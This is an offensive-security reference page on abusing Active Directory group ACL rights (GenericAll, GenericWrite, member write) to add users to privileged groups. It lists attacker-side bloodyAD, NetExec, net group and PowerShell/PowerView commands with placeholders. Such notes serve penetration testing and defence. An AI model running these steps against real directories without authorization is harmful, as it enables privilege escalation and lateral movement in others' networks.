---
title: "Abuse ACL access over groups"
description: Use access rights over a group to add users
categories: [Active Directory, Privilege Escalation]
tags: [Active Directory, Privilege Escalation, Lateral Movement, ACL Abuse]
weight: 2
---

Members of an Active Directory security group receive the access rights and privileges granted to that group. If the principal we control has `GenericAll`, `GenericWrite`, or write access to the group's `member` attribute, we can add another principal (e.g. a low-privileged user) to the group. `Self-Membership` (`AddSelf`) only permits adding the principal exercising that right, not an arbitrary user. `AllExtendedRights` alone is not write access to `member`. A fresh logon or refreshed Kerberos tickets may be needed before the new membership is reflected in access checks.

## Linux Perspective
From a Linux attacker machine, we can use bloodyAD or NetExec to add a user to a group. NetExec's SMB/SAMR method below supports global security groups; use LDAP for domain local or universal groups.
```bash
bloodyAD --host <dc_host> -d <domain> -u <username> -p <password> add groupMember <target_group> <target_user>
```
```bash
nxc smb <dc_host> -u <username> -p <password> -M modify-group -o USER=<target_user> GROUP=<target_group>
```

## Windows Perspective
We can use the native `net group` utility to add a user to a domain global group.
```cmd
net group <target_group> <target_user> /add /domain
```

With PowerShell, we may use either the `Add-ADGroupMember` cmdlet from the ActiveDirectory module (RSAT), or `Add-DomainGroupMember` from PowerView.
```PowerShell
Add-ADGroupMember -Identity <target_group> -Members <target_user>
```
```PowerShell
Add-DomainGroupMember -Identity <target_group> -Members <target_user>
```

